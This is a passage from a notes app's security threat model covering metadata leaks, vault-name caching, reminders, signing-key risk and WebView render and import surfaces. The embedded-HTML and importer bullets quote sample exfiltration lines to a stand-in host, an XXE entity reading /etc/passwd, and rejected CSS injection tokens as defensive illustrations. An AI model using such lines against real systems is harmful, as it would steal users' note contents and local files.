- **Blob size leaks information.** Even with all content encrypted, the size of each ciphertext blob and the count of blobs per account reveal something about note volume and usage. v1 does not pad. A future revision may introduce blob-size bucketing or padding to a granularity (e.g., 4 KiB). **The encrypted search-index blob `vault.search` (MYND-29; `spec/protocol.md` §9.6) is in the same class:** to an at-rest disk observer (A5) / a future sync observer (A13), its size leaks a coarse signal about the vault's indexed vocabulary and total note volume — strictly less than, and dominated by, the `.myn`-count + per-blob-size signal already accepted above (an index built from N notes is bounded by the same N notes). Accepted for v0.1 under the same no-padding posture; the same future bucketing/padding revision would cover it. `vault.search` adds no *new* class of leak — it is a derived cache of content whose size signal is already exposed by the `.myn` files themselves. **The encrypted editor workspace-state blob `vault.workspace` (MYND-166; `spec/protocol.md` §9.7) is likewise in this class:** its size leaks only a coarse open-tab-count signal, far below the `.myn`-count signal already accepted. More importantly, persisting *which notes are open* is **activity metadata (AS3)** that v0.1 deliberately keeps inside the AEAD envelope (under `session_state_key`) rather than as plaintext local app state — so a disk/filesystem adversary (A4/A5) learns neither the open-note set nor (because the blob is written only on graceful lock/quit, never per tab-switch — on mobile, lock plus app-background, see the dedicated bullet below) the *timing* of note switches from its mtime. It adds no new plaintext metadata surface. **The per-attachment extracted-text cache `attachments-text/<id>` (`MYE1`, MYND-328; `spec/protocol.md` §9.15) is in the same derived-cache class:** it holds text extracted on-device from an attachment (PDF/Word/text) — as of MYND-270 the **on-device ASR transcript of an audio attachment** (speech-to-text of an `audio/wav` `MYA1` blob), and as of MYND-441 the **on-device OCR of an image attachment or a scanned, text-layer-less PDF**, both of which ride this **same `MYE1` derived-cache class** (no new asset) — sealed under the `root_key`-derived `attachment_text_key`, so a disk observer (A5) learns only a coarse per-attachment size signal — already bounded by the `MYA1` source size beside it — and never the text. Extraction, audio transcription and OCR are **on-device only** (no cloud OCR/STT/extraction service is ever contacted — a standing anti-feature; the OCR weights are bundled and the runtime has no network surface, asserted by `src-tauri/scripts/ai-no-network-check.sh`), so none of them crosses a new trust boundary. OCR is **not** gated on `ai_enabled` — it is search correctness rather than an AI feature, so unlike `vault.embeddings` it is written in every build, including `--no-default-features`. It is the same "decrypted-at-rest derivative of user content" already accepted for `vault.search`: a rebuildable cache, purged on attachment deletion for cryptographic-erase parity (§9.15.4). It adds no new class of leak. **The on-device AI embedding index `vault.embeddings` (`MYR1`, MYND-453; `spec/protocol.md` §9.17) is in the same derived-cache class:** it holds semantic-search / Q&A vectors derived from `.myn` note plaintext, sealed under the `root_key`-derived KEK and wiped on lock, and is rebuildable from the notes on mismatch — so its at-rest size leaks only a coarse embedded-volume signal already bounded by the `.myn` count beside it (an index built from N notes is bounded by the same N notes). One honest nuance distinguishes it from the inverted index: a dense embedding is a *more complete* semantic reconstruction of note content than a term-frequency index — it is subject to embedding-inversion — but that exposure is bounded by the same events (A6/A7 RAM-forensic access / KEK compromise) that already expose the source `.myn` notes directly, so it grants no new adversary capability and adds no new class of leak. Embedding **never reaches a remote provider**, and that is why this claim survives the 2026-08-09 provider decision while the surrounding AI text did not: embedding fires on unlock and on save — without the user asking — so it is barred from the remote arm **at the seam, as a rule in the code rather than a setting**, and it is the highest-volume operation in the AI surface, which against a metered API would be an uncapped cost as well as an unasked-for disclosure. No cloud embedding service is ever contacted; that remains a standing anti-feature. A **local** model runtime may serve it, which crosses **TB12** and stays on the device — so the honest statement is "crosses no boundary that leaves the device", not the older "crosses no new trust boundary". It is written only when the runtime beta opt-in `ai_enabled` is on (an AI-free `--no-default-features` build never compiles the AI path and never writes it).
- **Named-workspace switch timing is coarsely observable at rest (bounded relaxation of §9.7.4).** Named, switchable workspaces (MYND-308; `spec/protocol.md` §9.7 `vault.workspace` `0x02`) add a hybrid save model whose active-slot pointer (`vault.prefs` `active_workspace`, §9.5.2) and layout descriptor must survive a crash. To avoid a per-switch file write — which would turn the `vault.workspace` / `vault.prefs` mtime into a high-resolution editor-activity log — the client **coalesces** these flushes to **at most once per ~5 minutes of active use, plus graceful exit / auto-lock** (the same time-coalescing pattern as snapshots below). The consequence is a deliberate, **bounded** relaxation of the prior graceful-exit-only cadence (§9.7.4): a filesystem adversary (A4/A7) can now infer that the user switched or rearranged workspaces *within* a ~5-minute window from the blob mtime — a coarse activity-timing signal, never the *content* of the switch. Workspace **names and layouts** remain inside the AEAD envelope under `session_state_key` (**AS3**) — the adversary learns neither which workspaces exist, nor their names, nor which notes any of them hold; only that *some* workspace activity occurred in a ~5-minute bucket. Accepted for v0.1 under the same at-rest-metadata posture as blob size + snapshot cadence; it is strictly coarser than the per-switch leak it replaces, and the crash-loss window is bounded to the same ~5 minutes. (`decisions.md` 2026-06-17 "Named, switchable workspaces"; SYNC-6.)
- **Mobile `vault.workspace` writes at backgrounding, not only at lock (bounded relaxation of §9.7.4).** The mobile client (MYND-561; `spec/protocol.md` §9.7.4 "Mobile exit analogs") persists the sidebar folder-expand set into `vault.workspace`, and resolves the desktop rule's "app quit" to **app-background** (`visibilitychange` → hidden / `pagehide`) alongside vault lock — because a phone app's normal death is an OS kill of a backgrounded process, which delivers no quit signal. A phone is backgrounded many times a day without locking, so to a filesystem adversary (A4/A5/A7) the blob's mtime is a **backgrounding-granularity** activity signal rather than the lock/quit-granularity one the desktop rule yields. Bounded on three axes: the write is **dirty-gated** (a session that never expanded or collapsed a folder writes nothing, so the mtime does not advance at all), it is **never per-interaction** (a folder toggle alone writes nothing — only an exit seam does), and the *content* — which folders are open — stays inside the AEAD envelope under `session_state_key` (**AS3**), so the adversary learns that *some* persisted view state changed before a backgrounding, never what. Accepted for v0.1 under the same at-rest-metadata posture as blob size, the MYND-308 coalesced workspace cadence above, and snapshot cadence below; the rejected alternative — writing only on lock — silently loses the state on the platform's normal termination path. (`decisions.md` 2026-07-25.)
- **Encrypted snapshots leak edit cadence at rest.** The per-note version-history feature (MYND-96; `spec/protocol.md` §9.1 `snapshots/`) writes an encrypted `.myn`-format blob per captured revision. To an at-rest disk observer (A5), the *count* of a note's snapshots and their on-disk *ordering* (UUIDv7-named) reveal a coarse signal about how often and how recently that note was edited — a signal the single-current-`.myn` model did not expose. This is accepted for v0.1 under the same no-padding posture as blob size above, and is bounded on several axes: snapshots are **local-only** (single-device; the sync server never receives them, so **AS6** — encrypted user-meaningful timestamps — stays intact), capture is **time-coalesced** (~5 min) rather than per-keystroke, retention is a **bounded window**, and a **flat** `snapshots/` directory (rather than per-note subdirectories) limits how legibly per-note counts are exposed. Snapshots add no *new* class of secret: their plaintext is the same note content already protected by the `.myn` files, sealed under the same `item_key`. Cryptographic erase is preserved — permanently deleting a note purges its snapshots (`decisions.md` 2026-06-08).
- **Encrypted CRDT notes (`NC05`) sync and back up their full edit-history — an AS6 exposure the `MY01` model kept local-only (automerge-sync-migration, `decisions.md` 2026-08-09).** The next-major CRDT note-type (`spec/protocol.md` §10.5) stores each note as one encrypted Automerge document whose payload is the note's **full change history**, not just its current text. Two consequences change the posture the `MY01` model + the local-only snapshots bullet above held: **(1)** unlike snapshots — which are deliberately kept off the server so **AS6** (user-meaningful edit timing) stays server-invisible — a CRDT note's history rides *inside* the synced blob and the `.myne-backup` container, so anyone who ever obtains that note's `item_key` (a `root_key` compromise, a leaked backup, a retained server ciphertext) can reconstruct **every past revision and deleted draft**, not merely the current content; and **(2)** the blob's *size* now grows with **edit count**, not content length, so blob size leaks a coarse per-note **edit-volume** signal beyond the existing size-leak class. This is **not** a forward-secrecy walk-back — v0.1 already declares no forward secrecy (§7 (4), `spec/protocol.md` §11) — it is a **widening of the retained-history exposure surface** the threat model states before the format ships. It is scoped to notes the user has explicitly migrated to `NC05` (migration is explicit + one-way, §10.4); a `MY01` note is unchanged. On the wire it is bounded exactly as every synced blob is (**TB5 intact** — the server sees only opaque ciphertext plus the existing size/timing/count metadata; the Automerge change-DAG, actor-ids, and change-hashes **never cross TB5 / the wire** — they are computed and compared only client-side. The device-local head frontier the sync loop compares (`doc_heads_hex`, persisted in `sync-state.json`) does sit **at rest in device-local plaintext**, under the same posture as the vault-head baseline (§9.16) — never synced, never backed up, visible only to an at-rest device / local-malware adversary (A5/A7) that already sees far more; it is not an AEAD-envelope contents leak on the wire, `decisions.md` 2026-08-09). The retained-history **depth** is bounded by a compaction/retention policy tracked separately (myne-md/myne#423, deferred); **until that lands, history is retained unbounded, and this bullet is the disclosure of that.** Accepted as a deliberate, recorded escalation for v0.1's next-major successor; marketing/limits copy must not claim a migrated note's history stays on-device. (automerge-sync-migration, myne-md/myne#421.)
- **Multi-vault registry leaks vault count + last-unlock timing at rest, and, since myne-md/myne#411, the *name* of every vault this device has unlocked.** Multi-vault (MYND-165) stores per-vault directories at `vaults/<VaultId>/` plus a best-effort plaintext `vaults/registry.json` cache holding each vault's opaque `VaultId` + last-unlock timestamp. To an at-rest disk observer (A5) / local malware (A7), this reveals **how many vaults exist** and **per-vault last-activity timing**; the pre-unlock vault **picker** (shown only at ≥2 vaults) surfaces the same count + last-unlock to anyone at the unlock screen (shoulder-surfer), and, for any row carrying no cached name, the `Vault N` fallback whose `N` ranks vaults by ascending `VaultId` (myne-md/myne#411). A `VaultId` is a UUIDv7 and its leading bits are its creation time, so that same observer also reads each vault's **creation rank on this device**. That is **bounded to relative ordering**: a position is rendered, never a timestamp. It is still a widening, because creation ordering was previously visible only to an adversary who could read `vaults/<UUIDv7>/` on disk, and because the fallback it replaced numbered rows by their position in the last-unlock ordering, which disclosed nothing that ordering did not already show. It is also what the hide-vault-names option below leaves on screen, so no key destruction removes it. It does **not** reveal note content, or account identity (`VaultId` is a random UUIDv7, decoupled from `account_number_hash`; what its leading bits encode is a creation time, never anything about the account). The vault-names half of that sentence is superseded by the paragraphs below; the rest of it stands. Accepted for v0.1 under the same no-padding / at-rest-metadata posture as blob size + snapshot cadence above, and bounded: the `vaults/<id>/` directory count already exposes the vault count regardless of the cache, so the registry adds no *new* leak class; it is non-authoritative (rebuildable from the disk-scan), so a future revision could encrypt it under an app-level key, but that adds key-management surface for marginal benefit. (`decisions.md` 2026-06-09 "Vault disk layout"; SYNC-7.)

  **The vault name is a separate exposure with its own bounds, and the sentence above does not cover it.** A vault's human-readable name is cached device-locally so the locked picker can show it after a relaunch, in a per-vault `MYL1` blob at the vault root sealed under a per-vault OS-keychain `wrap_key`. Only a vault this device has **unlocked at least once** is ever named: there is no key with which to read the label of one it has not, so the cache cannot imply knowledge the device does not have. `registry.json` itself is unchanged and still holds no name. Nothing here crosses **TB5**: the store is device-local, never synced, and structurally excluded from the `§9.11.3` backup allowlist, so no name reaches the server or a portable artefact.

  **The count's bounding argument above does NOT extend to names, and must not be reused for them.** That argument works because the `vaults/<id>/` directory listing already exposes the count. Directory names are random UUIDv7s and `vault.meta` carries no label field, so before this change a vault's name appeared **nowhere on disk outside its own AEAD envelope**. A name is also **user-authored text**, which the count and the timestamps never were. This is a new category of disclosure rather than a larger quantity of an old one, and it is recorded as one.

  **The user can take it back, and what that is worth has four limits worth stating.** The device-wide [hide vault names](glossary.md#hide-vault-names) option destroys every per-vault key and removes every `MYL1` file, which is cryptographic erase, the same posture `decisions.md` 2026-05-07 fixed for note deletion when it rejected platform-specific secure-delete. **First limit:** that protects against someone who reads the medium *afterwards*. A full-system snapshot taken while names were enabled carries both the ciphertext and the keychain, and destroying the key later does not reach that copy. **Second limit:** the cache is device-local and does not sync, so renaming a vault on one device leaves the old name on every other device's lock screen until that vault is unlocked there, and a locked device cannot learn otherwise. **Third limit:** the picker is a **pre-unlock** surface, so anyone who can see a locked device's screen reads the name of every vault this device has unlocked, and no key destruction reaches that. Erase acts on the medium; it does not act on a screen somebody has already read. Only enabling the option **before** a name is ever cached prevents that observer from seeing one at all, which is why the option is not developer-gated (`decisions.md` 2026-08-15). This is the exposure the feature deliberately creates, and it is the same observer the count and last-unlock sentence above already names. **Fourth limit:** the erase is durable, the suppression is not. The option's own state is a device-local **plaintext** JSON file (`<app_config_dir>/vault-names.json`, `{"hidden": bool}`) of the same class as `tor-routing.json`, outside any AEAD envelope, so the "Local prefs replay" bullet below does **not** bound it: that bullet's bound rests on AEAD verification and the `account_number_hash` AAD binding, and this file carries no MAC and no vault binding. An adversary with disk write can set it back to `false`; the write path re-reads the flag on every unlock and every rename, so the next unlock resumes caching names and mints a fresh keychain key for a user who asked that none ever be written. What was already erased stays erased, because that was a key destruction rather than a setting. Detection parity with that bullet does hold: the Privacy row reads the same file, so a reverted flag is visible on the next view. All four limits are stated to the user rather than left to be discovered. **No adversary rating changes.** (`decisions.md` 2026-06-09 "Vault disk layout" and 2026-06-09 "Multi-vault in-app switcher + label management", both superseded on the label clause; myne-md/myne#411.)
- **Scheduled task reminders hand pending times and their count to the operating system (MYND-618).** Delivering a reminder while Myne is closed requires the **operating system** to hold the registration, which means the pending reminder set leaves the AEAD envelope and sits in OS-owned storage in plaintext. **Scope as shipped (`decisions.md` 2026-07-30, narrowed 2026-08-29):** everything in this entry describes the **OS-registration tier**, and **no client ships it today**. The desktop delivers reminders only while it is running, so it hands no registration to any operating system. Mobile has the plugin and the ACL grant, but the pass that would reconcile the vault's tasks against what the OS holds has **no production caller** (`scripts/check-unwired.mjs`), so its registration set is empty too and the client no longer says otherwise (`decisions.md` 2026-08-29, myne-md/myne#508). **None of the exposure below currently applies to any build.** It is recorded rather than deleted because both clients are one wiring change away from it: the desktop's native adapters stay gated behind the blocked delivery measurement, mobile's pass stays gated on acquiring a caller, and the entry applies unchanged, with no re-rating, on whichever change lands first. Three observers see it: the **at-rest device adversary (A5)**, **local malware (A7)**, and — because a notification can surface on a locked screen — a **shoulder-surfer at the lock screen**. What leaks is the **times** of pending reminders, their **count**, and therefore the length of the scheduling horizon. What does **not** leak is task text or note content: the notification body is **content-free by default**, carrying no task description, and the registration payload carries no note identifier a reader could resolve. The leak is bounded on four axes: the horizon is **short** (only reminders within it are ever registered), and since myne-md/myne#508 it is user-adjustable only **downward** from the seven-day default, which is also the clamp ceiling, so every reachable horizon is no longer than the one this entry accepts, the registration set is **never synced** and **never backed up** (it is device-local OS state, rebuilt from the vault on unlock), the **server boundary is untouched** — the sync server sees nothing of this and **AS6** (encrypted user-meaningful timestamps) stays intact — and the whole surface exists only while the feature is enabled. The nearest precedent is the **multi-vault registry** bullet above: also plaintext at rest, also a count plus timing, also naming the shoulder-surfer, and likewise **not** a downgrade of the headline at-rest rating — qualifying that rating once per feature would, after a few features, make it meaningless. **No adversary rating changes.** The **Linux gap** — no equivalent OS pre-registration surface, so reminders fire only while Myne is running — is classified as a **usability limitation, not a security one**: a platform that holds no registration leaks nothing, so the gap is strictly the safer side of this trade. **Mobile (MYND-619) inherits this posture unchanged and adds two asymmetries, both on the *acting* side rather than the *leaking* side.** The registration surface is identical — the same content-free body, the same short horizon, the same `{identifier, local instant}` payload and nothing else — and the identifier handed to the platform is **16 random bytes minted per registration**, so nothing in the OS store resolves to a note even for a reader holding it; there is **no push service and no push token anywhere in the mobile path**, so **TB5 stays untouched** and no per-device liveness signal is created. **(1) On Android, part of the pending set is held in a file Myne itself writes.** The platform exposes no way to enumerate an app's registered alarms, so the client keeps its own `{identifier → instant}` record in app-private storage — both to answer "what is pending" and to re-register after a restart, since Android drops every pending alarm on reboot and on app update. The *content* is exactly what this entry already records (pending times, their count, the horizon length) and it carries no note identifier or task text; what differs is the *holder* — the app rather than the operating system — so on Android the exposure does not end when the OS notification store is cleared. iOS holds the whole set itself and needs no such record. **(2) Acting on a tap is heavier than on the desktop, and heaviest on Android.** A tap on a locked device cold-launches the app; the identifier is latched **in memory only**, never written to disk, and consumed exactly once after unlock — the deep-link ingress pattern already recorded for the widgets, and a tap that arrives with nothing listening is dropped rather than queued, because the only alternative to dropping is a file. On desktop and iOS a quick-unlock provider can stand between the tap and the task; **Android has no quick-unlock provider at all** (the shared provider is Apple-Keychain-backed and Android answers `HardwareUnavailable` until a Keystore provider lands), so a cold-start tap on an Android reminder lands on a **full master-password Argon2id unlock**. That is a **usability** asymmetry rather than a security downgrade — the heavier path is the one demanding *more* credential, not less — but it is the difference between "reminded me and I acted" and "reminded me and I could not". **No adversary rating changes.**
- **Sync timing leaks usage patterns.** The version counter changes when a client pushes; an observer can correlate counter increments with real-time activity. v1 does not implement timing randomization or cover traffic.
- **Note creation time is server-visible, durably, via the UUIDv7 blob id (AS6).** A note's id is a UUIDv7, its `.myn` filename is that id (`protocol.md` §9.1), and that same id is the note's sync wire key (`sync-protocol.md` §4.2). UUIDv7 embeds a millisecond Unix timestamp in its leading 48 bits, so the sync server's per-vault index *is* a per-note creation-time series: when the vault was started, how it grew, when the user wrote in bursts and when they stopped. This is **stored state, not a transient observation** — unlike the sync-timing item above, it survives in the server's index and is therefore compellable under A2. It is not a new leak class at rest (`protocol.md` §9.4 already accepts the filename as plaintext, so A5/A7 have always seen it); what §7 records here is that it reaches **TB5**, which the AS6 row previously said it did not. Accepted for v0.1. **Both code-side alternatives are major-version changes, not doc patches or near-term options:** switching note ids to UUIDv4 would *delete* `created_at` outright — the id is its only carrier, since `markdown-dialect.md` deliberately keeps a `created:` field out of frontmatter — and the `.myn` filename format is normative in `protocol.md` §9.1, so changing it is a §10.1 event; deriving an opaque per-note sync-id would need a keyed HMAC over the note UUID (the `attachments-id-hmac` shape, not the `catalog-sync-id` singleton shape), which contradicts `sync-protocol.md`'s normative "a note's key is its 16-byte UUID" and touches the §4.2 manifest key — and it would close only the TB5 half, leaving the on-disk filename leaking to A5/A7 exactly as before.
- **The release-signing key is a single point of compromise.** A leaked or coerced key lets an attacker publish a hash list that authenticates a malicious artifact, which defeats client-side encryption for anyone who downloads it during the window. **Two things this bullet claimed until 2026-08-25 were false** (entry 0534): there is no auto-update to push such a build through (entry 0481, TB7), so it reaches only people who download in that window, and the signing is not hardware-backed. What holds: the key is held offline and outside CI, build and signing are separate steps, and the hashes are cross-published on a second origin so a single compromised origin does not settle the question. Verification is manual and opt-in, so none of it protects a user who downloads and runs without checking. Cannot eliminate the risk.
- **No formal third-party audit in v1.** Compensating controls (Section 6) are a credible substitute, not equivalent. If revenue from hosted sync grows enough to fund a formal audit, that becomes a priority.
- **No mobile in v1.** Users on iOS/Android remain on substitute stacks (Obsidian + Cryptomator + Möbius). The audience that wants E2EE most acutely on mobile is unserved by Myne during Phase 1–2.
- **No plausibly-deniable encryption.** Coercion (A12) reveals the data. v1 makes no attempt at deniability; consider in v2+ only with caution — partial deniability schemes are easy to misimplement and easy to claim falsely.
- **Self-host operator log policy is out of our control.** The protocol prevents the server from seeing plaintext, but a malicious self-host operator can still log connection IPs, retain old ciphertexts after deletion, or correlate metadata. Self-host documentation will explicitly state which operator behaviors are *protocol-level* (cannot be done) versus *policy-level* (must be enforced by the operator).
- **Argon2id parameters on low-end mobile.** The shipped v0.1 parameters are `m=256 MiB, t=3, p=2` (`spec/protocol.md` §4.1) — four times the memory of the `m=64 MiB, t=5` draft figure this bullet used to quote, so the problem is heavier than it read, not lighter. 256 MiB is a lot to ask of a low-end Android device. Either accept slow logins on low-end phones or ship per-device parameter profiles encoded in the encrypted blob. Decision deferred until mobile work begins — bounded, though, not open-ended: `spec/protocol.md` §4.2.1 fixes the accepted cost range any per-device profile must land inside, and a client rejects a vault outside it before Argon2id runs.
- **Embedded-HTML render surface (MYND-209).** Rendering a curated safe subset of note-authored HTML in the WebView (TB2) is a deliberate, bounded XSS-surface addition that supersedes the prior "raw HTML → plain monospace, no XSS surface" posture (`decisions.md` 2026-06-08; `markdown-dialect.md` §8). The control is an ultra-tight DOMPurify allowlist (8 elements, `title`-only attribute) with rendering via `innerHTML` of **sanitized output only** — never raw note bytes; off-allowlist tags (`<script>`/`<iframe>`/`<img>`) and HTML inside code are not rendered. CSP (`script-src 'self'`, no `'unsafe-inline'`; `object-src 'none'`) is defense-in-depth, not the primary control. The threat is a crafted/imported note attacking the user on render; the residual risk is a DOMPurify bypass (mitigated by its large install base, single purpose, and exact-pin). **What a bypass can send outward, stated at the right fidelity (myne#383).** No remote *fetch* is possible (no `src`/`href` survives, and `connect-src` allows no off-origin destination). Remote *navigation* is a separate channel that CSP structurally cannot govern: `navigate-to` shipped in no engine, and `default-src` falls back only for fetch directives, so no policy written in `tauri.conf.json` could refuse `location = "https://…/?d=" + noteBody`. This clause previously read "so a bypass could not exfiltrate", which overstated the guarantee — the fetch half was closed and the navigation half was simply unexamined. The bound is now a host-side `on_navigation` allowlist admitting only the app's own origins (`src-tauri/src/navigation.rs`, a command-less plugin covering both the main and the pdf-export webview), plus `form-action 'none'` for the form-submission form of the same channel and `base-uri 'none'` against a `<base>` injected to repoint relative asset URLs. **The mobile client carries the same bound as of myne#453** (`mobile/src-tauri/src/navigation.rs`, plus the same three directives in its own `tauri.conf.json`: `form-action 'none'`, `base-uri 'none'` and `frame-ancestors 'none'`): it renders this surface in the same kind of WebView from the same shared editor, so for as long as the desktop half shipped alone the clause above was true of one client and not of the other. Three limits stated rather than implied: on Windows the hook sees only top-level navigations (wry does not wire `add_FrameNavigationStarting`), so a sub-frame there is bounded by `frame-src` alone; on **Android** `WebViewClient.shouldOverrideUrlLoading` (the hook wry installs there) is not called for POST requests, so a form submission is invisible to the allowlist and is bounded by `form-action 'none'` instead; and in a dev build the frontend is served by Vite rather than the `tauri://` protocol handler, so no CSP is attached at all and the navigation allowlist is the only one of these controls that runs. The mobile allowlist is unit-tested and CI-run, but no CI lane executes an iOS or Android build, so its device behaviour is **not verified**. A manual checklist exists (`mobile/docs/dev/device-matrix.md` §11) and nothing schedules it: no CI step names it, no release runbook references it, and it had not been run on either platform when this shipped. State it as the gap it is rather than as a compensating control, because a control nobody owns and nothing records is a claim. What IS verified is the unit-tested matching logic and the config strings; what is not is that the host hook fires on a device at all. **And this bullet is the WebView's own load-and-navigate surface, not an exhaustive account of outbound reach**: the ACL grants `opener:default` on both clients, so a script that already has the DOMPurify bypass this residual assumes can hand `https://evil.example/?d=<noteBody>` to the OS browser through `plugin:opener|open_url`, with no navigation and no fetch for any of the controls above to see. That grant is what makes an ordinary autolink open where the user expects, it predates this bullet on both clients, and it is named here because the enumeration otherwise reads as closed, which is the same overstatement this clause already had to correct once. **Multi-color highlight (`decisions.md` 2026-06-15) widens `ALLOWED_ATTR` to `[title, class]` — assessed as NOT a meaningful surface increase.** `class` is constrained by an `uponSanitizeAttribute` hook to exactly one token from a closed 5-value enum (`hl-yellow|hl-green|hl-blue|hl-pink|hl-purple`) on a single tag (`<mark>`); no arbitrary class, no multi-class, no `style`, no selector injection, no remote fetch. The only new capability an attacker-authored note gains is painting one of five fixed background washes — purely cosmetic. The residual risk remains the same DOMPurify-bypass class, unchanged in magnitude by an enum-constrained attribute.
- **Importer untrusted-markup parse surface (MYND-580).** The importer-breadth epic adds a **second** untrusted-markup parse surface alongside the embedded-HTML render surface above: three of the four new [import adapters](glossary.md#import-adapter) (Evernote ENML, generic HTML, Notion HTML) convert attacker-influenceable markup to markdown in the WebView (TB2). Three controls bound it. **(i) XXE-safety is structural, not procedural.** Every Evernote export legitimately carries an external-DTD doctype (`<!DOCTYPE en-export SYSTEM "http://xml.evernote.com/pub/evernote-export3.dtd">`); a parser that resolved external entities would both **fetch a remote URL** — violating the standing no-remote-fetch anti-feature from a path whose premise is that the importer never reaches the network — and accept `<!ENTITY x SYSTEM "file:///etc/passwd">`, reading local files into note content. Parsing goes through `DOMParser`, which loads no external DTD, resolves no external entity, executes no script, and fetches no subresource for a document with no browsing context, so the doctype is inert **by construction**. **(ii) The parsed document is never attached to the live DOM** — it is walked into markdown and discarded; the invariant is asserted by test, not just documented. **(iii) The import allowlist is expressed as the render allowlist plus an explicitly enumerated delta**, so the widening is what a reviewer audits and the two configs cannot silently desynchronize. The delta is wider than render — structural elements plus `href`/`src` — which is sound here for a different reason than render's: the **output is markdown text, not DOM**. A remote `![](https://…)` in that text is inert (`findImportedImageRefs` excludes URL-bearing refs so the importer never fetches them, and `markdown-dialect.md` §7 does not render a raw-path ref as an `<img>`), and URL schemes are narrowed to http/https/mailto/document-relative twice over — by `ALLOWED_URI_REGEXP` in the sanitizer and by an explicit walker check that *reports* the drop rather than swallowing it. Evernote `<en-crypt>` spans are **preserved verbatim as inert text**, never decrypted or executed — they are content the user deliberately protected under a passphrase Myne does not hold, so destroying them would be the worst available outcome. Residual risk is the same DOMPurify-bypass class already accepted for the render surface, in the same process, mitigated the same way (install base, single purpose, exact-pin) — no new adversary, asset, or trust boundary. (`decisions.md` 2026-07-25.)
- **Mermaid diagram render surface (MYND-49).** Rendering ```mermaid blocks as SVG (TB2 WebView) parses untrusted note content and injects SVG. Mermaid runs `securityLevel:'strict'` + `htmlLabels:false`, so it sanitizes its own output via its bundled DOMPurify (no click/script/`<foreignObject>` handlers, no raw-HTML labels); lazy-loaded, no remote fetch. This is the **heaviest dependency** Myne adds (≈+100 transitive packages) — the largest TB9 supply-chain expansion (`dependency-policy.md`), accepted as a conscious decision (`decisions.md` 2026-06-08) with lazy-load + exact-pin + the `securityLevel:'strict'` control. On any render/parse failure the block falls back to a plain monospace card.
- **Hidden PDF-export render window (MYND-255).** The per-note PDF export renders the note's HTML projection in a second, invisible WebView window for native print-to-PDF capture — a same-kind TB2 surface (plaintext already renders in a WebView), bounded by construction: a near-empty capability (the window can invoke only its payload-fetch and ready-signal commands), content protection applied before its first frame, destruction after every capture (success or failure), and teardown at every vault-lock path alongside the main window — locking the vault tears this plaintext surface down too. - **Custom-theme CSS-value surface (MYND-111).** A user-supplied custom theme (`custom themes` epic) is a plaintext `.json` map of CSS-variable values applied to `:root` via the CSSOM (`document.documentElement.style.setProperty`) — NOT injected as an inline `<style>` element, so it rides the WebView's existing `style-src 'unsafe-inline'` unchanged (no CSP loosening; `decisions.md` 2026-06-16). Because that value reaches the DOM and executes, the **primary** control is a host-side (Rust) value-shape **allowlist**: a value is accepted only when it matches a known-safe grammar (hex / `rgb()` / `rgba()` / `hsl()` / named color / `<number><unit>`), so the CSS escape hatches (`url()`, `expression()`, `@import`, `javascript:`, comment-/CSS-escape, trailing-`;` injection) are rejected by non-match rather than chased individually — the same ultra-tight-allowlist doctrine as the embedded-HTML surface above. The required-core tokens must be present and the theme name is path-traversal-guarded before any import. **The palette is vault content** (`decisions.md` 2026-07-16 supersedes the 2026-06-16 device-local-plaintext clause): it is sealed into the encrypted `vault.themes` blob (`MYT1`, `protocol.md` §9.21) under a `root_key`-derived KEK, so it is encrypted at rest, synced (a Class-1 singleton, `sync-protocol.md` §10.2.2), and included in a backup — a disk-at-rest adversary (A4/A7) no longer learns that a theme named X exists, and the A6 lock posture strengthens (the palette is now unreadable while the vault is locked, not merely un-applied). The **plaintext window narrows to explicit, user-initiated transfer**: a `.json` the user picks to import, one they deliberately export for portability, or a `myne://theme/install` deep link the user clicked and then confirmed (see the deep-link ingress note below) — the server never sees any of them (ZK unchanged). A custom theme remains **validated, not sandboxed** — the residual surface is an allowlist-grammar bug, not arbitrary CSS. **Second channel (myne#394):** a palette's *ornament* selections are additionally reflected onto the root element as `data-o-<role>-<primitive>` attributes, because CSS cannot branch on a custom property's value. This adds no new value surface — the attribute NAME is built from app constants and the VALUE must match an enumerated literal set before it is written, so nothing theme-controlled reaches `setAttribute` unchecked — and the rules those attributes select are Myne's own stylesheet, never the theme's. The rating is unchanged; the channel is recorded so the CSSOM sentence above is not read as exhaustive. Applies editor-only and reverts on lock (A6 parity, like the built-in Theme preference).
- **Tauri supply-chain surface.** Tauri's Cargo dependency tree is materially smaller than Electron's npm tree was, but transitive crate compromise (A8) remains feasible. Cargo lockfile pinning, `cargo-vet` or `cargo-audit` in CI, and a deliberately small direct-dependency surface are the response. The UI layer (React inside the Tauri WebView, bundled by Vite at build time) still pulls npm packages, but the security-critical crypto path lives in the Rust core and is isolated from the WebView via the IPC boundary. Choosing Vite + React over Next.js (`decisions.md` 2026-04-26) shrinks the direct-npm-dependency surface roughly tenfold.
- **Screen-capture protection is unavailable on macOS and on Linux, and degrades on Windows builds below 19041.** The three gaps have different causes and only one of them is ours to close, so they are listed apart. **macOS:** Apple documents `NSWindowSharingNone` as a legacy constant macOS no longer uses, with an explicit instruction not to use it to hide content from capture, and states no public API exists for preventing screen capture. The call is retained; nothing is claimed (§6). There is no timeline, because there is no API to adopt. **Linux:** no display server offers a client-requestable exclusion. On X11 this is architectural rather than a missing feature — any client can read the root window or a redirected window's pixmap, so there is nowhere to place the check, and no amount of client-side work changes that. On Wayland the capture path is mediated by the compositor, and two compositors ship an exclusion that is **user-configured, not application-requestable**: KWin's "Hide from Screencast" (Plasma 6.6, persisted as a window rule in 6.7) and Hyprland's `no_screen_share` window rule (0.50.0). GNOME/Mutter ships nothing. A client-facing Wayland protocol has been proposed upstream and has not landed; adopting it would then need `tao`/Tauri support before Myne could call it, so no commitment date is given. The honest user-facing guidance on Linux is the per-compositor rule above, not a promised release. **Windows below build 19041:** `SetWindowDisplayAffinity` silently degrades `WDA_EXCLUDEFROMCAPTURE` to `WDA_MONITOR`, which blacks the window out rather than excluding it.
